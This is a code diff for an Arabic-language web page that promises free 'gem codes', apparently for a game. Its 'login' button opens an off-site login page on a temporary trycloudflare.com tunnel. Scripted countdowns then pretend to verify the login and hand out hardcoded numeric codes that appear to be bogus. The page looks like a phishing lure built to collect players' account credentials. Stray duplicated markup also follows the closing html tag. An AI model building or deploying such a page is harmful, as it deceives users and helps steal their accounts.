@@ -84,6 +84,14 @@ button:disabled{ opacity:0.5; cursor:not-allowed; }
   font-weight:bold;
   text-shadow:0 0 15px #000;
 }
+
+.footer{
+  margin-top:40px;
+  padding:20px;
+  background:rgba(0,0,0,0.6);
+  border-top:2px solid #00eaff;
+  font-size:18px;
+}
 </style>
 </head>
 <body>
@@ -100,10 +108,121 @@ button:disabled{ opacity:0.5; cursor:not-allowed; }
   <h1>💎 نظام أكواد الجواهر التلقائي</h1>
   <p>قم بتسجيل الدخول ثم انتظر التحقق للحصول على كود الجواهر</p>
 
+  <!-- زر تسجيل الدخول -->
   <button id="loginBtn">🔐 تسجيل دخول</button>
   <br>
 
+  <!-- زر الحصول على الكود -->
   <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
+
+  <!-- زر تحديث الكود -->
+  <button id="refreshBtn">🔄 تحديث الكود</button>
+
+  <!-- عرض الكود والعداد -->
+  <div id="codeBox"></div>
+</div>
+
+<div class="footer">
+  💡 هذا الموقع يعرض نظام أكواد الجواهر بتصميم قوي 2026  
+  بعد تسجيل الدخول يتم التحقق ثم تفعيل الأكواد تلقائياً  
+  👨‍💻 المطور: ADEM
+</div>
+
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const codeBtn = document.getElementById("codeBtn");
+const refreshBtn = document.getElementById("refreshBtn");
+const codeBox = document.getElementById("codeBox");
+
+const codes = [
+"386855252454554",
+"252524242524244",
+"252524242424222",
+"252522222241222",
+"252522212242222",
+"252525222255283",
+"683825382425544",
+"383865242427242"
+];
+
+let index = 0;
+let logged = false;
+
+// عداد تسجيل الدخول 35 → 0
+function loginCountdown(){
+  let seconds = 35;
+  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
+
+  const timer = setInterval(() => {
+    seconds--;
+    codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
+
+    if(seconds <= 0){
+      clearInterval(timer);
+      codeBtn.disabled = false;
+      codeBox.textContent = "✅ تم التحقق! يمكنك الآن الضغط على الحصول على الكود";
+    }
+  }, 1000);
+}
+
+// عند الضغط على تسجيل الدخول
+loginBtn.addEventListener("click", () => {
+  window.open("https://sword-grants-warnings-mixing.trycloudflare.com/login.html", "_blank");
+
+  logged = true;
+  codeBtn.disabled = true;
+  codeBtn.style.display = "inline-block";
+  refreshBtn.style.display = "none";
+
+  loginCountdown();
+});
+
+// عداد الحصول على الكود 20 → 0
+function codeCountdown(callback){
+  let seconds = 20;
+  codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
+
+  const timer = setInterval(() => {
+    seconds--;
+    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
+
+    if(seconds <= 0){
+      clearInterval(timer);
+      callback();
+    }
+  }, 1000);
+}
+
+// زر الحصول على الكود
+codeBtn.addEventListener("click", () => {
+  if(!logged){
+    alert("يجب تسجيل الدخول أولاً!");
+    return;
+  }
+
+  codeBtn.disabled = true;
+
+  codeCountdown(() => {
+    codeBox.textContent = "💎 كود الجواهر: " + codes[index];
+    index = (index + 1) % codes.length;
+
+    // إغلاق ميزة الحصول على الكود وظهور التحديث
+    codeBtn.style.display = "none";
+    refreshBtn.style.display = "inline-block";
+  });
+});
+
+// زر تحديث الكود (إرجاع النظام من جديد)
+refreshBtn.addEventListener("click", () => {
+  refreshBtn.style.display = "none";
+  codeBtn.style.display = "inline-block";
+  codeBtn.disabled = false;
+  codeBox.textContent = "🔄 تم تحديث النظام! اضغط على الحصول على الكود من جديد";
+});
+</script>
+
+</body>
+</html>  <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
   <button id="refreshBtn">🔄 تحديث الكود</button>
 
   <div id="codeBox"></div>
